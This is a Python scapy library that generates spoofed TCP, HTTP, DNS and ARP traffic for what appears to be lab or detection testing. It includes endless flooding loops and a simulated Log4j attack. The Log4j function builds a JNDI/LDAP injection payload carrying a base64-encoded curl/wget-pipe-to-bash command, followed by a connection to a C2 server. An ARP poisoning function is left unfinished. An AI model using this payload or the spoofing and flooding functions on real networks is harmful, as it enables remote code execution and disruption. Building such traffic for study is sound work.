import Custom_lafng as CLa
import random
import struct
import time
import base64


"""
This lib generates fake network traffic and simulates some famous network attacks.
"""
#### some data 

web_sites_list = ['facebook.com' , 'wikipedia.org','pinterest.com','google.com','youtube.com','amazon.com','twitter.com','wordpress.com','reddit.com','linkedin.com','instagram.com','ebay.com','pinterest.co.uk','amazon.co.uk','pinterest.es','yahoo.com','quora.com','pinterest.ca','','pinterest.de','apple.com','fandom.com','tripadvisor.com','amazon.in','walmart.com','yelp.com','pinterest.ch','researchgate.net','amazon.ca','medium.com','nytimes.com','pinterest.at','pinterest.fr','pinterest.cl','ebay.co.uk','pinterest.com.mx','etsy.com','indeed.com','pinterest.com.au','nih.gov','dailymotion.com','bbc.com','theguardian.com','imdb.com','amazon.de','aliexpress.com','pinterest.ie','reverso.net','pinterest.co.kr','slideshare.net','pinterest.dk','pinterest.it','businessinsider.com','forbes.com','microsoft.com','shutterstock.com','mapquest.com','target.com','cnet.com','ebay.com.au','sciencedirect.com','issuu.com','cnn.com','pinterest.se','weebly.com','booking.com','indiatimes.com','pinterest.pt','foursquare.com','stackexchange.com','amazon.co.jp','yahoo.co.jp','amazon.es','findglocal.com','yellowpages.com','alibaba.com','github.com','wikihow.com','dailymail.co.uk','bbc.co.uk','pinterest.nz','picuki.com','washingtonpost.com','springer.com','msn.com','glassdoor.com','amazon.fr','soundcloud.com','goodreads.com','pinterest.ph','usatoday.com','britannica.com','flipkart.com','linguee.com','cambridge.org','dnb.com','thefreedictionary.com','desertcart.com','pinterest.ru','wiley.com','wikiwand.com','homedepot.com','tripadvisor.co.uk','ebay.ca','spotify.com','tumblr.com','indiamart.com','rakuten.co.jp','agoda.com','healthline.com','pinterest.jp','telegraph.co.uk','jstor.org','joom.com']

CLause = CLa.Fuse
sc = CLa.sc 

HTTP_methods =['GET' , 'POST']
DomainsEx = ['com' , 'org' , 'eg' , 'co' , 'uk' , 'net' , 'se' , 'ae' , 'sa' , 'fr' , 'jp' ]
alf = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
exten = ['asp' , 'ASHX' ,'ARO' ,'ASPX' , 'ATOM' , 'ATT' , 'AXD' , 'html' , 'php' , 'js' , 'css' ]


MacTable = ["r"]
IpTable = ["r"] 
ThisInterFace = []
OurServerData = []

##################################################################################################################
##############   using pcaplib for wireshark (Default - non-custom ) you can only use scapy send here ############
##################################################################################################################

###################################################### SetUp 
def RandomStringGenrator(MaxStringLen):
    String = ''
    x = random.randint(2,MaxStringLen)
    for i in range(x):
    	String += random.choice(alf)
    return String 

def HttpPathGenerator():
    Path = RandomStringGenrator(30)
    path = Path + '.'+random.choice(exten)
    return Path

######################################################## TCP #############################################################################
## Assume that after the connection happens, the server and client exchange.
def TcpSyn(SrcIp , DstIp ):
    SrcPort = random.randint(1500 ,65000) 
    DstPort = random.randint(1500 ,65000)
    PacSequ = random.randint(1 , 1000000)
    connection = sc.IP(src= SrcIp, dst = DstIp)
    Syn = sc.TCP(sport=SrcPort , dport = DstPort , flags = 'S' , seq = PacSequ )
    sc.send(connection/Syn)
    return SrcPort , DstPort , PacSequ

## Remember to change each syn src to DST and DST to src.

def TcpCooker(SrcIp , DstIp , SrcPort , DstPort , flag , PacSequ = random.randint(1 , 1000000)  ):
    connection = sc.IP(src= SrcIp, dst = DstIp)
    SynAck = sc.TCP(sport=SrcPort , dport = DstPort , flags = flag  , seq = PacSequ )
    sc.send(connection/SynAck)
    return PacSequ

def TcpPushAck(SrcIp , DstIp , SrcPort , DstPort , PacSequ = random.randint(1 , 1000000)):
    Payload = 'Fack network by Labib\' Fack network generator '
    connection = sc.IP(src= SrcIp, dst = DstIp)
    PushAck = sc.TCP(sport=SrcPort , dport = DstPort ,flags = 'PA' ,  urgptr = len(Payload))
    sc.send(connection/PushAck/Payload)
    return PacSequ

def BasicTcp(SrcIp , DstIp ):
    SrcPort , DstPort , PacSequ  =  TcpSyn(SrcIp , DstIp )
    time.sleep(0.1)
    TcpCooker(DstIp , SrcIp , DstPort , SrcPort , 'SA' )
    time.sleep(0.1)
    PacSequ = TcpCooker(SrcIp  , DstIp , SrcPort , DstPort , 'A'  )
	## imagen some pushs, rets . etc ...  here 
    time.sleep(0.1)
    TcpPushAck(SrcIp , DstIp , SrcPort  , DstPort , PacSequ )
    time.sleep(0.1)
    TcpPushAck(DstIp , SrcIp , DstPort , SrcPort)
    time.sleep(0.1)
    PacSequ =  TcpCooker(SrcIp , DstIp , SrcPort  , DstPort , 'A')
    time.sleep(0.1)
    TcpCooker(SrcIp , DstIp , SrcPort , DstPort , 'F' , PacSequ)
    time.sleep(0.1)
    TcpCooker(DstIp , SrcIp , DstPort , SrcPort , 'FA')
    time.sleep(0.1)
    TcpCooker(SrcIp , DstIp , SrcPort , DstPort , 'A')
    time.sleep(2)
	# Any error in packets, the reason should be "seq", wait for the custom version of the script.


########################################################## HTTP section ###################################################################


def httpRequets(ipSorce , ipDest , path, hostName ):
    ip      = sc.IP(src = ipSorce , dst = ipDest )
    payload = random.choice(HTTP_methods) + ' /'+path+' HTTP/1.0\r\nHost: '+ hostName + "\r\n\r\n" 
    port = random.randint(1500 ,65000)
    tcp     = sc.TCP(sport = port , dport = 80 )
    request = ip/tcp/payload
    sc.send(request )
    return port 
    
def httpRsponce(ipSorce , ipDest ,port  , hostName , reponce = 404 ):
    ip  = sc.IP(src = ipSorce , dst = ipDest )
    tcp = sc.TCP(sport = 80 , dport = port , flags="A"  )
    mess = "created by Labib's fake network traffic generator "
    payload = "HTTP/1.0 404 NOT Found\r\nServer: test \r\nContent-Length: "+str(len(mess)+24)+"\r\n\r\n"+mess+"\r\nConnection: close \r\n\r\n"
    if reponce == 200 : 
    	payload = "HTTP/1.0 200 OK\r\ncreated by Labib's fake network traffic generator\r\n\r\n"
    request = ip/tcp/payload 
    sc.send(request )

def fakeHttpTraffic(ipSorce , ipDest , path ,  hostName , respon ):
    port = httpRequets(ipSorce , ipDest , path , hostName )
    time.sleep(0.2)
    httpRsponce(ipDest,ipSorce , port , respon )

########################################################### YOU MUST CALL THESE FUNCTIONS FIRST. ####################################################################

def TablesAndDataSetup(IpRangeStart , IpRangeEnd , MacSign1 , MacSign2 , InterFace ):
    ThisInterFace.append(InterFace)
    LsGo = CLause.ip2int(IpRangeStart)
    MacTable.pop()
    IpTable.pop()
    while LsGo < CLause.ip2int(IpRangeEnd)+1 :
    	IpTable.append(CLause.ip2str(LsGo))
    	MacTable.append(CLause.rand_mac(MacSign1, MacSign2))
    	LsGo += 1 
    ForServer = IpTable.index(random.choice(IpTable))
    OurServerData.append(IpTable[ForServer])
    del IpTable[ForServer]
    OurServerData.append(MacTable[ForServer])
    del MacTable[ForServer]

def GenDomains(DomainsNumber):
    while len(web_sites_list) < DomainsNumber: 
    	web_sites_list.append(RandomStringGenrator(30)+'.'+random.choice(DomainsEx))
	

################################################### ARP Section  #######################################################

def FakeArpAsk(srcArpIp , dstArpIp  , dstArpMac = '00:00:00:00:00:00' ):
    if dstArpIp == srcArpIp : 
    	while dstArpIp == srcArpIp :
    		dstArpIp = random.choice(IpTable)

    arp = sc.ARP(psrc = srcArpIp  , hwdst = dstArpMac , hwsrc = MacTable[IpTable.index(srcArpIp)] , pdst = dstArpIp )
    sc.send(arp )
    return srcArpIp , dstArpIp 


def FakeArpReply(srcArpIp  , dstArpIp  , dstArpMac  , srcArpMac ) :
    if dstArpIp ==  srcArpIp :
    	while dstArpIp == srcArpIp : 
    		dstArpIp = random.choice(IpTable)
                
    dstArpMac = MacTable[IpTable.index(dstArpIp)]
    	
    srcArpMac = MacTable[IpTable.index(srcArpIp)]

    arp = sc.ARP(psrc = srcArpIp  , hwdst = dstArpMac , hwsrc = srcArpMac , op ='is-at', pdst = dstArpIp  ) 
    sc.send(arp )

def ArpTraffic(srcArpIp , dstArpIp  ):
    FakeArpAsk(srcArpIp , dstArpIp )
    time.sleep(0.5)
    FakeArpReply(dstArpIp , srcArpIp , MacTable[IpTable.index(srcArpIp)] , MacTable[IpTable.index(dstArpIp)]  )


############################################################ DNS section ################################################################

## just to test the function

def testSendFakeDns():
    ip  = sc.IP( dst= '8.8.8.8')
    udp = sc.UDP(dport = 53)
    dns = sc.DNS(rd = 1 , qd = sc.DNSQR(qname ='www.google.com'))
    request = ip/udp/dns
    a = sc.sr1(request  , iface = ThisInterFace[0] )
    return a    
############################## Send dns request from an IP you select to dns server asking for the domain name ip >> the response is not fake.
def dnsGenerate(srcIP , dstIP , domainName):
    ip  = sc.IP(src = srcIP , dst = dstIP)
    udp = sc.UDP(dport = 54)
    dns = sc.DNS(rd = 1 , qd = sc.DNSQR(qname = domainName))
    request = ip/udp/dns
    sc.send(request , iface = ThisInterFace[0])

############################# Send dns request to dns server using random IP src address.
def fakeDnsRequestGenerator(SenderIp , DnsServerIp , domainName ):
    sorce = SenderIp
    ip  = sc.IP(src = sorce  , dst = DnsServerIp )
    sport = random.randint(1500 , 60000)
    udp = sc.UDP(sport = sport ,  dport = 53)
    dns = sc.DNS(rd = 1 , qd = sc.DNSQR(qname = domainName))
    request = ip/udp/dns
    sc.send(request )
    return sorce , sport 

def fakeDnsRsponceGenetate(ResIp , port , DnsServerIp , domainName , rip = CLause.socket.inet_ntoa(struct.pack('>I', random.randint( 1 , 0xffffffff )))   ):
    dest = ResIp
    ip  = sc.IP(src = DnsServerIp  , dst = dest )
    udp = sc.UDP(sport = 'domain' ,  dport = port )
	
    dns = sc.DNS(id = 0 , qr =1 , opcode='QUERY' ,aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0 ,rcode='ok', qdcount=1, nscount=0, arcount=0 ,qd= sc.DNSQR(qname=domainName, qtype='A', qclass='IN') , an= sc.DNSRR(rrname = domainName , type='A' , rclass ='IN' , rdata = rip ) )
    request = ip/udp/dns
    sc.send(request  )
    return rip

def DnsFakeTraffic(SenderIp  , DnsServerIp , domainName):
    dst , port = fakeDnsRequestGenerator(SenderIp , DnsServerIp , domainName)
    time.sleep(0.2)
    rip = fakeDnsRsponceGenetate(dst , port , DnsServerIp , domainName)
    time.sleep(0.2)
    return dst , rip

##################################################################### compine #################################################

def fakeDnsAndHttp(DnsServerIp ,path  , respon = 404):
    domainName = random.choice(web_sites_list)
    src , rip  = DnsFakeTraffic(random.choice(IpTable), random.choice(DnsServerIp) , domainName )
    fakeHttpTraffic(src , rip, path, domainName  , respon )

##################################################################### Attacks #################################################

### ARP posining 

def OneWayArpPois(AttackerIp , TargetIp):
    fakeARPask


################ Log4j 

## Remember To add some log4j jam traffic/functions.

def MainLog4jAttack(AttackerIp ,DownloaderServer , C2ServerIp , DomainName ):
    base64Part = base64.b64encode(('(curl -s '+DownloaderServer+'/'+OurServerData[0]+':80||wget -q -O- '+DownloaderServer+'/'+OurServerData[0]+':80)|bash').encode('utf-8'))
    Payload = '/?x=${jndi:ldap://'+AttackerIp+':'+str(random.randint(1500, 60000))+'/Basic/Command/Base64/'+base64Part.decode('utf-8')
    fakeHttpTraffic(AttackerIp , OurServerData[0] , Payload , DomainName , 200 )
    time.sleep(10)
    BasicTcp(OurServerData[0] , C2ServerIp )

####################################################################################################################################
########################################### custom proctocols Traffic  #############################################################
####################################################################################################################################

def CuArpAskinEthr(Ar_Hware_Type = 2 , Protocol_Type= 0x800  , Opcode=1 ,Sender_Hw_Mac='88:88:88:88:88:88', Sender_Ip_Add='44.44.44.44' ,Target_Mac='ff:ff:ff:ff:ff:ff' ,Target_Ip_Add='55.55.55.55' , Eth_Type = 0x806  ):
    et = CLa.ETH(Target_Mac , Sender_Hw_Mac  , Eth_Type )
    ar = CLa.ARP(Ar_Hware_Type , Protocol_Type , Opcode ,Sender_Hw_Mac , Sender_Ip_Add ,Target_Mac , Target_Ip_Add )
    sc.sendp(et+ar , iface = ThisInterFace[0])
	#time.sleep(0.2)

def CuArpRepEthr(Ar_Hware_Type = 2 , Protocol_Type= 0x800  , Opcode=2 ,Sender_Hw_Mac='88:88:88:88:88:88', Sender_Ip_Add='44.44.44.44' ,Target_Mac='ff:ff:ff:ff:ff:ff' ,Target_Ip_Add='55.55.55.55' , Eth_Type = 0x806 ) : 
    et = CLa.ETH(Target_Mac , Sender_Hw_Mac  , Eth_Type )




######################################################################################### TrafficJam
###### Just Creat A thread And Call One of these Functions.

def DNS_HTTP_Jam(DnsServerIp ):
    while 1 :
    	fakeDnsAndHttp( DnsServerIp , HttpPathGenerator())
    	time.sleep(0.5)

def HTTP_Jam():
    while 1 : 
    	fakeHttpTraffic(random.choice(IpTable) , CLause.socket.inet_ntoa(struct.pack('>I', random.randint(1 , (255*255*255*255)-1))) , HttpPathGenerator() ,  random.choice(web_sites_list)  , 404 )
    	time.sleep(0.5)

def DNS_Jam(DnsServerIp):
    while 1 : 
    	DnsFakeTraffic(random.choice(IpTable) , random.choice(DnsServerIp) , random.choice(web_sites_list) )
    	time.sleep(0.5)

def Basic_TCP_Jam():
    while 1 :
    	BasicTcp(random.choice(IpTable) , OurServerData[0])
    	time.sleep(1)

def Arp_Jam():
    while 1 : 
    	ArpTraffic(random.choice(IpTable) , random.choice(IpTable) )
    	time.sleep(0.5)
